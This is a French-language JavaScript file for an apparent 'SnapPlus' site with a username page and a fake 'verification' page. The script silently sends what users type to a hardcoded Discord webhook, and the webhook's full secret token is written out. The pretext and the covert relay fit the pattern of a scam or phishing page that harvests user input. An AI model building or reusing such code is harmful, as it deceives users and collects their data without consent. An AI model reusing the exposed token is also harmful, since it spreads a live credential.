```javascript
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536105952720330752/XsDrxHH4dWxbBcT4EgA4zP42BlF5bFYSbOVDAUaQbm83D15HTrfifVL-FwGEyhoXlUCC";


// ================================
// PAGE 1 : PSEUDO
// ================================

const pseudoForm = document.getElementById("pseudoForm");

if (pseudoForm) {
  pseudoForm.addEventListener("submit", function (event) {
    event.preventDefault();

    const pseudoInput = document.getElementById("pseudo");
    const errorMessage = document.getElementById("errorMessage");
    const submitButton = document.getElementById("submitButton");
    const buttonText = submitButton.querySelector(".button-text");

    const pseudo = pseudoInput.value.trim();

    if (pseudo.length < 2) {
      errorMessage.textContent =
        "Ton pseudo doit contenir au moins 2 caractères.";
      return;
    }

    errorMessage.textContent = "";

    sessionStorage.setItem("snapplus_pseudo", pseudo);

    submitButton.disabled = true;
    buttonText.textContent = "Continuer…";

    window.location.href = "verification.html";
  });
}


// ================================
// PAGE 2 : VÉRIFICATION
// ================================

const verificationForm =
  document.getElementById("verificationForm");

if (verificationForm) {

  verificationForm.addEventListener("submit", async function (event) {
    event.preventDefault();

    const firstPart =
      document.getElementById("firstPart");

    const secondPart =
      document.getElementById("secondPart");

    const errorMessage =
      document.getElementById("verificationError");

    const button =
      document.getElementById("verificationButton");

    const buttonText =
      button.querySelector(".button-text");

    const first = firstPart.value.trim();
    const second = secondPart.value.trim();

    if (first.length === 0 || second.length === 0) {
      errorMessage.textContent =
        "Remplis les deux parties du pseudo.";
      return;
    }

    errorMessage.textContent = "";

    button.disabled = true;
    firstPart.disabled = true;
    secondPart.disabled = true;
    buttonText.textContent = "Envoi…";

    const message =
      "🔎 Confirmation SnapPlus\n\n" +
      "Première partie : " + first + "\n" +
      "Deuxième partie : " + second;

    try {

      const response = await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: message
        })
      });

      if (!response.ok) {
        throw new Error("Discord HTTP " + response.status);
      }

      window.location.href = "success.html";

    } catch (error) {

      console.error(error);

      errorMessage.textContent =
        "L'envoi Discord a échoué. Vérifie la console avec F12.";

      button.disabled = false;
      firstPart.disabled = false;
      secondPart.disabled = false;
      buttonText.textContent = "Confirmer →";
    }
  });
}
```
